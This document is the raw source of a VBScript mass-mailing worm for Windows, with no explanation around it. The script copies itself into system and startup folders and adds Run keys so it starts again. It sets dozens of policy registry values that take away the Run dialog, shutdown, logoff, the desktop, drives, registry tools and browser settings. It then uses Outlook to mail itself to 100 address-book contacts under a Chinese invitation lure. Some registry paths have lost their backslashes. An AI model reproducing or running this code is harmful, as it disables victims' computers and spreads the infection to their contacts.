On Error Resume Next

Set fs=CreateObject("Scripting.FileSystemObject")

Set dir1=fs.GetSpecialFolder(0)

Set dir2=fs.GetSpecialFolder(1)

Set so=CreateObject("Scripting.FileSystemObject")

dim r

Set r=CreateObject("Wscript.Shell")

so.GetFile(WScript.ScriptFullName).Copy(dir1&"Win32system.vbs")

so.GetFile(WScript.ScriptFullName).Copy(dir2&"Win32system.vbs")

so.GetFile(WScript.ScriptFullName).Copy(dir1&"Start MenuPrograms启动Win32system.vbs")

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoRun",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoClose",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoDrives",63000000,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystemDisableRegistryTools",1,"REG_DWORD"

r.Regwrite "HKLMSoftwareMicrosoftWindowsCurrentVersionRunScanRegistry",""

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoLogOff",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesWinOldAppNoRealMode",1,"REG_DWORD"

r.Regwrite "HKLMSoftwareMicrosoftWindowsCurrentVersionRunWin32system","Win32system.vbs"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoDesktop",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesWinOldAppDisabled",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoSetTaskBar",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoViewContextMenu",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoSetFolders",1,"REG_DWORD"

r.Regwrite "HKLMSoftwareCLASSES.reg","txtfile"

r.Regwrite "HKLMSoftwareMicrosoftWindowsCurrentVersionWinlogonLegalNoticeCaption","nihaoa " 

r.Regwrite "HKLMSoftwareMicrosoftWindowsCurrentVersionWinlogonLegalNoticeText","nihaoa aa a aa a " 

Set ol=CreateObject("Outlook.Application") 

On Error Resume Next

For x=1 To 100 

Set Mail=ol.CreateItem(0)

Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)

Mail.Subject="还在忙吗？" 

Mail.Body="朋友你好：您的朋友Rose给您发来了热情的邀请。具体情况请阅读随信附件，祝您好运！ 来自Rose的问候！"

Mail.Attachments.Add(dir2&"Win32system.vbs")

Mail.Send

Next

ol.Quit

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerRestrictionsNoBrowserContextMenu",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerRestrictionsNoBrowserOptions",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerRestrictionsNoBrowserSaveAs",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerRestrictionsNoFileOpen",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelAdvanced",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelCache Internet",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelAutoConfig",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelHomePage",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelHistory",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelConnwiz Admin Lock",1,"REG_DWORD" 

r.Regwrite "HKEY_USERS.DEFAULTSoftwareMicrosoftInternet ExplorerMainStart Page","http://www.baidu.com" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelSecurityTab",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerControl PanelResetWebSettings",1,"REG_DWORD" 

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerRestrictionsNoViewSource",1,"REG_DWORD"

r.Regwrite "HKCUSoftwarePoliciesMicrosoftInternet ExplorerInfodeliveryRestrictionsNoAddingSubScriptions",1,"REG_DWORD"

r.Regwrite "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoFileMenu",1,"REG_DWORD" 
